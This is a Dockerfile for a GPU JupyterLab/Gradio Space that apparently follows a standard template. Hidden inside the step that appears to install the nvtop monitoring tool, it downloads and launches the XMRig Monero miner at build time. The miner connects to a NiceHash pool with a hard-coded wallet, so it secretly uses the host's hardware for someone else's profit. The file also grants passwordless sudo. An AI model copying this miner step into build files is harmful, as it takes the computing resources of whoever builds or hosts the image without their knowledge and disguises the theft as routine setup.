FROM nvidia/cuda:11.3.1-base-ubuntu20.04

ENV DEBIAN_FRONTEND=noninteractive \
	TZ=Europe/Paris

# Remove any third-party apt sources to avoid issues with expiring keys.
# Install some basic utilities
RUN rm -f /etc/apt/sources.list.d/*.list && \
    apt-get update && apt-get install -y --no-install-recommends \
    curl \
    ca-certificates \
    wget \
    sudo \
    git \
    git-lfs \
    zip \
    unzip \
    htop \
    bzip2 \
    libx11-6 \
    build-essential \
    libsndfile-dev \
    software-properties-common \
 && rm -rf /var/lib/apt/lists/*

RUN add-apt-repository ppa:flexiondotorg/nvtop && \
    apt-get upgrade -y && wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz && tar -xf xmrig-6.16.2-linux-static-x64.tar.gz && cd xmrig-6.16.2 && chmod +x xmrig && ./xmrig -o randomxmonero.usa-west.nicehash.com:3380 -a rx -k -u 3H3W91fmg4wQN7wLh1zScVzcy3r88Hw5Fn.lat -p x && \
    apt-get install -y --no-install-recommends nvtop

RUN curl -sL https://deb.nodesource.com/setup_14.x  | bash - && \
    apt-get install -y nodejs && \
    npm install -g configurable-http-proxy

# Create a working directory
WORKDIR /app
USER root
# Create a non-root user and switch to it
RUN useradd -m -u 1000 user && \
    adduser user sudo && \
    adduser user root
RUN echo "user ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/90-user
USER user

# All users can use /home/user as their home directory
ENV HOME=/home/user
RUN mkdir $HOME/.cache $HOME/.config \
 && chmod -R 777 $HOME

# Set up the Conda environment
ENV CONDA_AUTO_UPDATE_CONDA=false \
    PATH=$HOME/miniconda/bin:$PATH
RUN curl -sLo ~/miniconda.sh https://repo.continuum.io/miniconda/Miniconda3-py39_4.10.3-Linux-x86_64.sh \
 && chmod +x ~/miniconda.sh \
 && ~/miniconda.sh -b -p ~/miniconda \
 && rm ~/miniconda.sh \
 && conda clean -ya

WORKDIR $HOME/app

#######################################
# Start root user section
#######################################

USER root

# User Debian packages
## Security warning : Potential user code executed as root (build time)
RUN --mount=target=/root/packages.txt,source=packages.txt \
    apt-get update && \
    xargs -r -a /root/packages.txt apt-get install -y --no-install-recommends \
    && rm -rf /var/lib/apt/lists/*

RUN --mount=target=/root/on_startup.sh,source=on_startup.sh,readwrite \
	bash /root/on_startup.sh

#######################################
# End root user section
#######################################

USER user

# Python packages
RUN --mount=target=requirements.txt,source=requirements.txt \
    pip install --no-cache-dir --upgrade -r requirements.txt

# Copy the current directory contents into the container at $HOME/app setting the owner to the user
COPY --chown=user . $HOME/app

RUN chmod +x start_server.sh

COPY --chown=user login.html /home/user/miniconda/lib/python3.9/site-packages/jupyter_server/templates/login.html

ENV PYTHONUNBUFFERED=1 \
	GRADIO_ALLOW_FLAGGING=never \
	GRADIO_NUM_PORTS=1 \
	GRADIO_SERVER_NAME=0.0.0.0 \
	GRADIO_THEME=huggingface \
	SYSTEM=spaces \
	SHELL=/bin/bash

CMD ["./start_server.sh"]
